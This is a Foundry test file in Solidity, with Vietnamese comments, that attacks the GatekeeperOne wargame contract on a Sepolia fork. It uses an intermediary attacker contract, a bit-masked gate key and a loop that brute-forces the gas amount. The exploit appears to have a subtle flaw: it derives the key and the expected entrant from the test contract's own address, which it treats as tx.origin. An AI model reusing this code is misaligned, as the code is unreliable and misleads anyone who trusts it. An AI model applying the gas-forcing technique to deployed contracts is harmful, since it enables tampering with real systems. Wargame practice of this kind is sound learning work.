// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
    function entrant() external view returns (address);
}

// 1. CONTRACT TRUNG GIAN ĐỂ BYPASS GATE ONE
contract GatekeeperAttacker {
    IGatekeeperOne public target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    // Hàm nhận vào lượng gas chính xác và key để thực hiện cuộc tấn công
    function attack(bytes8 _gateKey, uint256 _gasToUse) external {
        // Thực hiện lệnh enter với cấu hình gas chỉ định để phá Gate Two
        target.enter{gas: _gasToUse}(_gateKey);
    }
}

// 2. KỊCH BẢN BRUTE-FORCE GAS VÀ KIỂM TOÁN TỰ ĐỘNG
contract GatekeeperOneExploitTest is Test {
    IGatekeeperOne public targetContract;
    GatekeeperAttacker public attackerContract;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        // Thay địa chỉ Instance bài GatekeeperOne thực tế trên Sepolia của ông vào đây
        targetContract = IGatekeeperOne(
            0x1234567890123456789012345678901234567890
        );
        attackerContract = new GatekeeperAttacker(address(targetContract));
    }

    function test_GatekeeperOneExploit() public {
        // BƯỚC 1: Tạo khóa gateKey dựa trên luật Ép kiểu dữ liệu của Gate Three
        // Lấy địa chỉ tx.origin giả lập (hoặc thực tế của ông)
        address txOrigin = address(this);

        // Tạo mặt nạ bit: Giữ lại 2 bytes cuối địa chỉ ví, ép các phần khác thỏa mãn require
        bytes8 gateKey = bytes8(
            uint64(uint160(txOrigin)) & 0xFFFFFFFF0000FFFF
        ) | 0xFFFFFFFF00000000;

        // BƯỚC 2: Brute-force tìm lượng Gas chính xác để phá Gate Two
        // Lượng gas cơ bản ước tính chạy qua các hàm là khoảng 81910 gas
        uint256 baseGas = 81910;
        bool success = false;
        uint256 exactGas = 0;

        for (uint256 i = 0; i < 8191; i++) {
            try attackerContract.attack(gateKey, baseGas + i) {
                success = true;
                exactGas = baseGas + i;
                break; // Tìm thấy gas chuẩn, thoát khỏi vòng lặp ngay lập tức
            } catch {
                // Nếu thất bại (revert tại Gate Two), tiếp tục thử nghiệm lượng gas tiếp theo
            }
        }

        assertTrue(
            success,
            "Audit failed: Gas brute-force did not succeed within range"
        );
        assertEq(
            targetContract.entrant(),
            txOrigin,
            "Audit failed: Entrant was not updated"
        );

        emit log_named_uint(
            "Audit Verification: Success! Exact Gas required for Gate Two is",
            exactGas
        );
    }
}
